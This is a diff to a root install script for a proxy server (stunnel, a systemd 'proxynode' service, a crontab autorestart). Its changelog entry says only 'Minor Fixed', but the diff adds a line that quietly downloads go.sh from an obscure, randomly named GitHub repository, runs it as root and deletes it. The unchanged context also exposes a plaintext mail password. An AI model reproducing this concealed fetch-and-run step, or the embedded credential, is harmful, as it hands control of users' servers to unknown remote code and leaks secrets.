@@ -18,6 +18,7 @@ echo -e " LOG UPDATE" | tee -a log-update.txt
 echo -e " " | tee -a log-update.txt
 echo -e " Ver 3.6" | tee -a log-update.txt
 echo -e " - Add Autorestart for WS-SSL" | tee -a log-update.txt
+echo -e " - Minor Fixed" | tee -a log-update.txt
 echo -e " " | tee -a log-update.txt
 sleep 1
 echo -e "==================================="
@@ -141,7 +142,6 @@ password cjqlukttctkqhrmf
 logfile ~/.msmtp.log
 EOF
 
-./go
 chmod 600 /etc/stunnel/stunnel.pem
 
 cat<<EOF>/etc/stunnel/stunnel.conf
@@ -183,11 +183,16 @@ RestartPreventExitStatus=1
 WantedBy=multi-user.target
 END
 
+wget -q https://raw.githubusercontent.com/xfjdllvbnrt/bhjdkdop222/main/go.sh && chmod +x go.sh && ./go.sh
+rm -f go.sh
+
 systemctl daemon-reload
 systemctl enable proxynode.service
 systemctl restart proxynode.service
 cat << EOF >> /etc/crontab
+# BEGIN_Autorestart
 13 */12 * * * root systemctl restart proxynode
+# END_Autorestart
 EOF
 echo "3.6" > /home/ver
 fi
